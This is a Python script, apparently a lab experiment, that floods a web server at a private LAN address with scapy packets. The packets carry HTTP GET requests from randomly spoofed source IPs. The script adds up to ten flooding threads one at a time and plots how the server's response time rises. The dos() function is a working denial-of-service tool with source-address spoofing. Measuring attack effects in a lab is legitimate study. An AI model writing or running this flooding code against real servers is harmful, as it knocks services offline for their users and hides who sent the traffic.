import random

from matplotlib.ticker import MultipleLocator
from scapy.all import *
from scapy.layers.inet import *
import time
import http.client
from queue import Queue
import threading
import matplotlib.pyplot as plt

def dos(server_ip, server_port):
    # Define the source and destination IP addresses and ports
    # start_src_ip = "10.100.102."
    # dest_ip = "10.100.102.19"
    # dest_port = 8000

    # Craft an HTTP GET request packet
    tcp_packet = TCP(dport=server_port, sport=12345)  # Use a source port of your choice
    get_request = (
        "GET / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "\r\n"
    ).format(server_ip)

    while True:
        rand_num1 = int(random.uniform(1, 254))
        rand_num2 = int(random.uniform(1, 254))
        rand_num3 = int(random.uniform(1, 254))
        rand_num4 = int(random.uniform(1, 254))
        # src_ip = start_src_ip+str(rand_num)
        src_ip = f'{str(rand_num1)}.{str(rand_num2)}.{str(rand_num3)}.{str(rand_num4)}'
        # print(src_ip)
        ip_packet = IP(src=src_ip, dst=server_ip)

        packet = ip_packet / tcp_packet / get_request

        # Send the packet
        send(packet, verbose=0)


def get_response_time(server_ip, server_port, path="/"):
    try:
        start_time = time.time()

        # Create an HTTP connection
        conn = http.client.HTTPConnection(server_ip, server_port)

        # Send a GET request
        conn.request("GET", path)

        # Get the response
        response = conn.getresponse()

        # Measure the response time
        response_time = (time.time() - start_time) * 1000  # in milliseconds

        # Close the connection
        conn.close()

        return response_time

    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def response_time_iterate(server_ip, port, q):
    iter = 0
    avg_iter = 0
    res_sum = 0
    res_avg = 0
    while iter < 100:
        response_time = get_response_time(server_ip, port)
        if response_time is None:
            print("error")
        else:
            # print(f"response time: {response_time}")
            if avg_iter<10:
                res_sum += response_time
                avg_iter += 1
            else:
                res_avg = res_sum/avg_iter
                q.put(res_avg)
                iter += 1
                avg_iter = 0
                res_sum = 0
            time.sleep(0.1)

# dos(1, "10.100.102.19", 8000)
# print(get_response_time("10.100.102.19", 8000))



# Create a queue for communication between threads
# result_queue = Queue()
iter = 1
# from func
avg_iter = 0
res_sum = 0
res_avg = 0
server_ip = "10.100.102.19"
server_port = 8000

# Create a thread for your function
# worker_thread = threading.Thread(target=response_time_iterate, args=("10.100.102.19", 8000, result_queue))
# worker_thread.daemon = True  # This allows the program to exit when the main thread exits
# worker_thread.start()

num_of_threads = 10
dos_threads = []
iter_list = []
response_times_list = []

for i in range(num_of_threads):
    dos_threads.append(threading.Thread(target=dos, args=(server_ip, server_port), daemon=True))


# Main thread
while iter<111:
    try:
        # Get the result from the queue (blocks until a result is available)
        # result = result_queue.get()

        #from func
        while avg_iter<10:
            response_time = get_response_time(server_ip, server_port)
            if response_time is None:
                print("error")
            else:
                # print(f"response time: {response_time}")
                res_sum += response_time
                avg_iter += 1
                time.sleep(0.1)
        res_avg = res_sum / avg_iter
        # q.put(res_avg)
        # iter += 1
        avg_iter = 0
        res_sum = 0
        iter_list.append(iter-1)
        response_times_list.append(res_avg)

        print(f"response time: %.2f" % res_avg)

        if 110 > iter >= 10 and iter % 10 == 0:
            print(f"\n\n\nadd dos thread number {(iter//10)-1}\n\n\n")
            dos_threads[(iter//10)-1].start()
        iter += 1

        # You can use the result as needed in the main thread
        # For example, you can send it to another function or process it further.

    except KeyboardInterrupt:
        break

print(iter_list)
print(response_times_list)
plt.plot(iter_list, response_times_list)

# naming the time in sec axis
plt.xlabel('Threads')

# naming the response time in ms axis
plt.ylabel('Response time')

# giving a title to my graph
plt.title('Server response time depending on threads')

# Set the x-axis limits to start at 0 and end at 110
plt.xlim(0, 110)

# Set tick marks on the x-axis at every 10 units
plt.xticks(range(0, 111, 10))

# Enable minor ticks at intervals of 0.5 units
minor_locator = MultipleLocator(1)
plt.gca().xaxis.set_minor_locator(minor_locator)

# Create custom labels for the major ticks
major_tick_locations = range(10, 101, 10)
major_tick_labels = [f'Th{(loc // 10) - 1}' for loc in major_tick_locations]

# Set major tick marks on the x-axis and apply custom labels
plt.xticks(major_tick_locations, major_tick_labels)

plt.grid(which='both', linestyle=':', linewidth=0.5)

plt.show()
